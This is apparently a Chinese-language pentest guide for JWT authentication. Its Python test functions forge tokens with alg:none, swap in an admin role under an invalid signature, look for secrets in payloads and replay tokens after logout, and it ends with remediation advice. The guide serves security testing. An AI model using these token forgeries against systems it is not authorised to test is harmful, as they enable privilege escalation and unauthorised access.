# JWT认证测试

## 测试方法

### 1. alg:none 伪造

```python
def test_jwt_alg_none(token):
    """
    测试JWT算法是否为none
    """
    try:
        # 解码payload
        parts = token.split('.')
        header = json.loads(base64_decode(parts[0]))
        
        # 修改算法为none
        header['alg'] = 'none'
        
        # 重新编码
        new_token = base64_encode(json.dumps(header)) + '.' + parts[1] + '.'
        
        # 测试伪造的token
        r = requests.get(api_url, headers={'Authorization': f'Bearer {new_token}'})
        if r.status_code == 200:
            return {"vuln": True, "type": "JWT alg:none"}
    except:
        pass
    return {"vuln": False}
```

### 2. 签名不验证

```python
def test_jwt_no_signature(token):
    """
    测试JWT是否不验证签名
    """
    parts = token.split('.')
    # 修改payload
    payload = json.loads(base64_decode(parts[1]))
    payload['role'] = 'admin'
    
    # 使用错误的签名
    new_token = parts[0] + '.' + base64_encode(json.dumps(payload)) + '.invalid_signature'
    
    r = requests.get(api_url, headers={'Authorization': f'Bearer {new_token}'})
    if r.status_code == 200:
        return {"vuln": True, "type": "JWT 签名不验证"}
    return {"vuln": False}
```

### 3. 敏感信息泄露

```python
def test_jwt_info_leak(token):
    """
    测试JWT是否泄露敏感信息
    """
    try:
        parts = token.split('.')
        payload = json.loads(base64_decode(parts[1]))
        
        # 检查敏感字段
        sensitive_fields = ['password', 'secret', 'key', 'token']
        leaked = []
        for field in sensitive_fields:
            if field in payload:
                leaked.append(field)
        
        if leaked:
            return {"vuln": True, "leaked": leaked, "payload": payload}
    except:
        pass
    return {"vuln": False}
```

### 4. Token重放测试

```python
def test_token_replay(token):
    """
    测试登出后Token是否仍然有效
    """
    # 使用token访问
    r1 = requests.get(api_url, headers={'Authorization': f'Bearer {token}'})
    
    # 调用登出
    requests.post(logout_url, headers={'Authorization': f'Bearer {token}'})
    
    # 再次使用token访问
    r2 = requests.get(api_url, headers={'Authorization': f'Bearer {token}'})
    
    if r1.status_code == 200 and r2.status_code == 200:
        return {"vuln": True, "type": "Token注销后仍有效"}
    return {"vuln": False}
```

## JWT解码方法

```bash
# 解码JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6ImFkbWluIn0.dGVzdA" | base64 -d
```

## 修复建议

```
1. 使用强密码算法（RS256而非HS256）
2. 验证签名必须执行
3. 不要在JWT中存储敏感信息
4. 实现Token黑名单/注销机制
5. 设置合理的Token过期时间
```
